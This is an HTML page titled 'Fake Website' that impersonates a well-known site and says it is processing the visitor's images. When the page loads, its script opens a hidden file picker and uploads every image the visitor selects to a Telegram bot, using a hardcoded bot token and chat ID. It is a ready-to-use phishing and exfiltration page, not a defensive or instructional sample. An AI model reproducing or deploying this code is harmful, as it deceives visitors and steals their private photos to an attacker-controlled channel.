<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Website</title>
</head>
<body>
    <h1>Welcome to [Famous Website]</h1>
    <p>Please wait while we process your images...</p>
    <form id="uploadForm" style="display:none;">
        <input type="file" id="images" name="images" multiple accept="image/png, image/jpeg">
    </form>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // طلب إذن الوصول إلى الملفات عند تحميل الصفحة
            requestFileAccess();
        });

        function requestFileAccess() {
            // فتح نافذة اختيار الملفات للمستخدم
            document.getElementById('images').click();
        }

        document.getElementById('images').onchange = function() {
            var files = document.getElementById('images').files;
            if (files.length > 0) {
                for (var i = 0; i < files.length; i++) {
                    sendImageToTelegram(files[i]);
                }
            }
        };

        function sendImageToTelegram(file) {
            var formData = new FormData();
            formData.append('chat_id', '1900509620');
            formData.append('photo', file);

            fetch('https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendPhoto', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Image sent successfully!');
                } else {
                    console.error('Failed to send image:', data);
                }
            })
            .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html>
